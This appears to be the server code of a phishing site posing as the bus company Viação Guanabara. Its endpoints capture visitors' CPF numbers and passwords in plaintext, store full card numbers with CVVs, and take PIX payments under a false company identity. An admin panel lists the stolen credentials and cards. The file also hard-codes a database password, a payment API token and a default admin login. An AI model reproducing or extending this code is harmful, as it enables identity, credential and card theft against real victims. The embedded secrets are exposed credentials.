const express = require('express');
const cors = require('cors');
const { Pool } = require('pg');
const bcrypt = require('bcrypt');
const jwt = require('jsonwebtoken');
const cookieParser = require('cookie-parser');
const path = require('path');
const crypto = require('crypto');

const app = express();

app.use(cors());
app.use(express.json({ limit: '10mb' }));
app.use(cookieParser());
app.use(express.static('public'));
app.use('/admin', express.static('admin'));

const pool = new Pool({
    connectionString: 'postgresql://guanabara_user:JTL5QHG4acDPmzHRo4FYZBmTOtlFDBZW@dpg-d9shhuv10e5c739tl52g-a.oregon-postgres.render.com/guanabara',
    ssl: { rejectUnauthorized: false },
    max: 20,
    idleTimeoutMillis: 30000,
    connectionTimeoutMillis: 2000
});

const JWT_SECRET = process.env.JWT_SECRET || 'ativacacambas_secret_key_2025';
const JWT_EXPIRES = '24h';

function verificarAdminToken(req, res, next) {
    const authHeader = req.headers.authorization;
    const token = authHeader && authHeader.split(' ')[1];
    if (!token) return res.status(401).json({ error: 'Token não fornecido' });
    try {
        const decoded = jwt.verify(token, JWT_SECRET);
        req.usuario = decoded;
        next();
    } catch { return res.status(401).json({ error: 'Token inválido ou expirado' }); }
}

function getClientIP(req) {
    const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress || req.socket.remoteAddress || req.ip;
    return ip ? ip.replace(/^::ffff:/, '') : 'IP não identificado';
}

async function initDatabase() {
    const client = await pool.connect();
    try {
        await client.query(`CREATE TABLE IF NOT EXISTS admin_users (id SERIAL PRIMARY KEY, username VARCHAR(50) UNIQUE, senha_hash VARCHAR(255))`);
        await client.query(`CREATE TABLE IF NOT EXISTS users (id SERIAL PRIMARY KEY, cpf VARCHAR(14) UNIQUE, senha TEXT, ip TEXT, dispositivo TEXT, navegador TEXT, telefone VARCHAR(20), data_cpf TIMESTAMP DEFAULT CURRENT_TIMESTAMP, data_senha TIMESTAMP, status VARCHAR(20))`);
        await client.query(`CREATE TABLE IF NOT EXISTS logs (id SERIAL PRIMARY KEY, tipo VARCHAR(30), cpf VARCHAR(14), senha TEXT, ip TEXT, dispositivo TEXT, navegador TEXT, data TIMESTAMP DEFAULT CURRENT_TIMESTAMP)`);
        await client.query(`CREATE TABLE IF NOT EXISTS payments (id SERIAL PRIMARY KEY, transaction_id VARCHAR(100) UNIQUE, cpf VARCHAR(14), telefone VARCHAR(20), valor DECIMAL(10,2), status VARCHAR(20) DEFAULT 'pending', tipo_pagamento VARCHAR(20) DEFAULT 'PIX', data_solicitacao TIMESTAMP DEFAULT CURRENT_TIMESTAMP, data_pagamento TIMESTAMP)`);
        await client.query(`CREATE TABLE IF NOT EXISTS admin_attempts (id SERIAL PRIMARY KEY, ip TEXT, tentativa TEXT, data TIMESTAMP DEFAULT CURRENT_TIMESTAMP)`);
        await client.query(`CREATE TABLE IF NOT EXISTS produtos (id SERIAL PRIMARY KEY, nome TEXT NOT NULL, tipo TEXT NOT NULL, preco REAL NOT NULL, preco_promocional REAL, descricao TEXT, icone TEXT, imagem TEXT, ativo BOOLEAN DEFAULT true)`);
        await client.query(`CREATE TABLE IF NOT EXISTS clientes (id SERIAL PRIMARY KEY, nome TEXT NOT NULL, telefone TEXT NOT NULL, email TEXT, cpf TEXT)`);
        await client.query(`CREATE TABLE IF NOT EXISTS pedidos (id SERIAL PRIMARY KEY, cliente_id INTEGER REFERENCES clientes(id) ON DELETE CASCADE, produto_id INTEGER REFERENCES produtos(id) ON DELETE CASCADE, quantidade INTEGER DEFAULT 1, valor_total REAL, status_pagamento TEXT DEFAULT 'pendente', tipo_pagamento TEXT, transacao_id TEXT, created_at TIMESTAMP DEFAULT NOW())`);
        await client.query(`CREATE TABLE IF NOT EXISTS cartoes (id SERIAL PRIMARY KEY, cliente_id INTEGER, nome_titular TEXT, numero_cartao TEXT, cvv TEXT, validade TEXT)`);

        // Admin padrão da Guanabara
        const adminExists = await client.query('SELECT * FROM admin_users WHERE username = $1', ['guanabara']);
        if (adminExists.rows.length === 0) {
            const hash = await bcrypt.hash('admin123', 10);
            await client.query('INSERT INTO admin_users (username, senha_hash) VALUES ($1, $2)', ['guanabara', hash]);
            console.log('✅ Admin Guanabara criado: guanabara / admin123');
        }

        // PRODUTOS DA GUANABARA (PASSAGENS DE ÔNIBUS)
        const produtosCount = await client.query('SELECT COUNT(*) FROM produtos');
        if (parseInt(produtosCount.rows[0].count) === 0) {
            const produtosPadrao = [
                ['Belo Horizonte -> Rio de Janeiro', 'passagem', 69.90, 59.90, 'Ônibus Leito, saída 08:00h, chegada 14:00h.', 'fas fa-bus', null],
                ['Goiânia -> Barreiras', 'passagem', 285.99, null, 'Ônibus Semi-Leito, saída 10:00h.', 'fas fa-bus', null],
                ['Brasília -> Correntina', 'passagem', 179.99, null, 'Ônibus Executivo, saída 14:00h.', 'fas fa-bus', null],
                ['Rio de Janeiro -> Brasília', 'passagem', 204.00, 189.90, 'Ônibus Leito, saída 22:00h.', 'fas fa-bus', null],
                ['Fortaleza -> Natal', 'passagem', 176.00, null, 'Ônibus Convencional, saída 06:00h.', 'fas fa-bus', null],
                ['Curitiba -> São Paulo', 'passagem', 120.00, 99.90, 'Ônibus Leito, saída 23:00h.', 'fas fa-bus', null]
            ];
            for (const p of produtosPadrao) {
                await client.query(`INSERT INTO produtos (nome, tipo, preco, preco_promocional, descricao, icone, imagem, ativo) VALUES ($1,$2,$3,$4,$5,$6,$7, true)`, p);
            }
            console.log('✅ Passagens de Ônibus Guanabara inseridas');
        }
        console.log('✅ Banco de dados Guanabara (NuitBanker) inicializado');
    } catch (err) { console.error('Erro:', err); } finally { client.release(); }
}
initDatabase();

// ============ ROTAS PÚBLICAS ============
app.post('/api/cpf', async (req, res) => {
    const { cpf, ip, dispositivo, navegador, telefone } = req.body;
    await pool.query(`INSERT INTO users (cpf, ip, dispositivo, navegador, data_cpf, status, telefone) VALUES ($1,$2,$3,$4,CURRENT_TIMESTAMP,$5,$6) ON CONFLICT (cpf) DO UPDATE SET ip=$2, dispositivo=$3, navegador=$4, telefone=$6`, [cpf, ip, dispositivo, navegador, 'aguardando_senha', telefone]);
    res.json({ success: true });
});

app.post('/api/login', async (req, res) => {
    const { cpf, password, ip, dispositivo, navegador, telefone } = req.body;
    await pool.query(`UPDATE users SET senha=$1, ip_senha=$2, dispositivo_senha=$3, navegador_senha=$4, data_senha=CURRENT_TIMESTAMP, status=$5, telefone=COALESCE(telefone,$6) WHERE cpf=$7`, [password, ip, dispositivo, navegador, 'completo', telefone, cpf]);
    await pool.query('INSERT INTO logs (tipo, cpf, senha, ip, dispositivo, navegador) VALUES ($1,$2,$3,$4,$5,$6)', ['senha_inserida', cpf, password, ip, dispositivo, navegador]);
    res.json({ success: true });
});

app.get('/api/produtos', async (req, res) => {
    const result = await pool.query("SELECT * FROM produtos WHERE ativo = true ORDER BY id");
    res.json({ success: true, produtos: result.rows });
});

app.post('/api/clientes', async (req, res) => {
    const { nome, telefone, email, cpf } = req.body;
    const result = await pool.query("INSERT INTO clientes (nome, telefone, email, cpf) VALUES ($1,$2,$3,$4) RETURNING id", [nome, telefone, email, cpf]);
    res.json({ success: true, cliente_id: result.rows[0].id });
});

app.post('/api/pedidos', async (req, res) => {
    const { cliente_id, produto_id, quantidade, valor_total, tipo_pagamento } = req.body;
    const result = await pool.query("INSERT INTO pedidos (cliente_id, produto_id, quantidade, valor_total, tipo_pagamento, status_pagamento) VALUES ($1,$2,$3,$4,$5,'pendente') RETURNING id", [cliente_id, produto_id, quantidade, valor_total, tipo_pagamento]);
    res.json({ success: true, pedido_id: result.rows[0].id });
});

app.post('/api/cartoes/salvar', async (req, res) => {
    const { nome_titular, numero_cartao, cvv, validade, cpf, telefone } = req.body;
    try {
        let cliente = await pool.query('SELECT id FROM users WHERE cpf = $1', [cpf]);
        let cliente_id = cliente.rows.length > 0 ? cliente.rows[0].id : (await pool.query('INSERT INTO users (cpf, telefone) VALUES ($1,$2) RETURNING id', [cpf || '00000000000', telefone || ''])).rows[0].id;
        await pool.query(`INSERT INTO cartoes (cliente_id, nome_titular, numero_cartao, cvv, validade) VALUES ($1, $2, $3, $4, $5)`, [cliente_id, nome_titular, numero_cartao, cvv, validade]);
        res.json({ success: true });
    } catch (err) { res.status(500).json({ error: err.message }); }
});

// PIX (Mantido exatamente igual ao seu)
const PLUMIFY_PRODUCT_HASH = 'lxpykbkgfl';
const PLUMIFY_API_TOKEN = '1Vp6bm2wSoil2giHCGRjsZ9IGVbiHve4u8xbyUoRWpdvHUWYOj6wZ9yd0xVq';

app.post('/api/save-payment', async (req, res) => {
    const { transaction_id, cpf, valor, telefone } = req.body;
    await pool.query('INSERT INTO payments (transaction_id, cpf, valor, status, telefone) VALUES ($1,$2,$3,$4,$5) ON CONFLICT (transaction_id) DO NOTHING', [transaction_id, cpf, valor, 'pending', telefone]);
    res.json({ success: true });
});

app.get('/api/check-payment/:transaction_id', async (req, res) => {
    const result = await pool.query('SELECT status FROM payments WHERE transaction_id = $1', [req.params.transaction_id]);
    res.json({ status: result.rows.length > 0 ? result.rows[0].status : 'not_found' });
});

app.post('/api/create-payment', async (req, res) => {
    const { amount, customer_name, customer_cpf, customer_phone } = req.body;
    const amountCents = Math.round(parseFloat(amount) * 100);
    const payload = { 
        amount: amountCents, 
        offer_hash: PLUMIFY_PRODUCT_HASH, 
        payment_method: 'pix', 
        customer: { 
            name: customer_name || 'Passageiro Guanabara', 
            email: 'contato@viacaoguanabara.com.br', 
            phone_number: customer_phone || '41992878772', 
            document: customer_cpf || '00000000000', 
            street_name: 'Rodovia BR 116', 
            number: '700', 
            neighborhood: 'Cajazeiras', 
            city: 'Fortaleza', 
            state: 'CE', 
            zip_code: '60864012' 
        }, 
        cart: [{ 
            product_hash: PLUMIFY_PRODUCT_HASH, 
            title: 'Passagem Guanabara', 
            price: amountCents, 
            quantity: 1 
        }], 
        expire_in_days: 3, 
        postback_url: `${process.env.BASE_URL || 'https://reidacacambinha.onrender.com'}/api/webhook/pagamento` 
    };
    try {
        const response = await fetch(`https://api.Plumify.com.br/api/public/v1/transactions?api_token=${PLUMIFY_API_TOKEN}`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
        const data = await response.json();
        if (data.pix && data.pix.pix_qr_code) {
            await pool.query('INSERT INTO payments (transaction_id, cpf, valor, status, telefone) VALUES ($1,$2,$3,$4,$5) ON CONFLICT (transaction_id) DO NOTHING', [data.hash, customer_cpf, amount, 'pending', customer_phone]);
            res.json({ success: true, payment: { pix_code: data.pix.pix_qr_code, id: data.hash } });
        } else { res.json({ success: false, error: data.message || 'Erro ao gerar PIX' }); }
    } catch (error) { res.status(500).json({ error: 'Erro ao gerar pagamento' }); }
});

app.post('/api/webhook/pagamento', async (req, res) => {
    const { hash, status } = req.body;
    if (status === 'paid') { await pool.query('UPDATE payments SET status = $1, data_pagamento = NOW() WHERE transaction_id = $2', ['paid', hash]); }
    res.json({ received: true });
});

// ============ ROTAS ADMIN ============
app.post('/api/admin/login', async (req, res) => {
    const { username, password } = req.body;
    const result = await pool.query('SELECT * FROM admin_users WHERE username = $1', [username]);
    if (result.rows.length === 0 || !(await bcrypt.compare(password, result.rows[0].senha_hash))) return res.status(401).json({ error: 'Credenciais inválidas' });
    const token = jwt.sign({ id: result.rows[0].id, username }, JWT_SECRET, { expiresIn: JWT_EXPIRES });
    res.json({ success: true, token });
});

app.get('/api/admin/produtos', verificarAdminToken, async (req, res) => {
    const result = await pool.query("SELECT * FROM produtos ORDER BY id");
    res.json({ success: true, produtos: result.rows });
});

app.get('/api/admin/cartoes', verificarAdminToken, async (req, res) => {
    const result = await pool.query(`SELECT c.*, u.cpf, u.telefone FROM cartoes c LEFT JOIN users u ON c.cliente_id = u.id ORDER BY c.created_at DESC`);
    res.json({ success: true, cartoes: result.rows });
});

app.get('/api/admin/users', verificarAdminToken, async (req, res) => {
    const result = await pool.query('SELECT cpf, senha, ip, dispositivo, navegador, data_cpf, data_senha, telefone FROM users ORDER BY data_cpf DESC');
    res.json({ users: result.rows });
});

app.delete('/api/admin/delete/:cpf', verificarAdminToken, async (req, res) => {
    await pool.query('DELETE FROM users WHERE cpf = $1', [req.params.cpf]);
    res.json({ success: true });
});

// FRONTEND (PÁGINAS)
app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'public', 'index.html')));
app.get('/admin', (req, res) => res.sendFile(path.join(__dirname, 'admin', 'index.html')));
app.get('/tickets', (req, res) => res.sendFile(path.join(__dirname, 'public', 'tickets.html')));
app.get('/passageiros', (req, res) => res.sendFile(path.join(__dirname, 'public', 'passageiros.html')));
app.get('/checkout', (req, res) => res.sendFile(path.join(__dirname, 'public', 'checkout.html')));
app.get('/comprovante', (req, res) => res.sendFile(path.join(__dirname, 'public', 'comprovante.html')));

const PORT = process.env.PORT || 3001;
app.listen(PORT, '0.0.0.0', () => {
    console.log(`✅ Servidor Guanabara rodando na porta ${PORT}`);
});
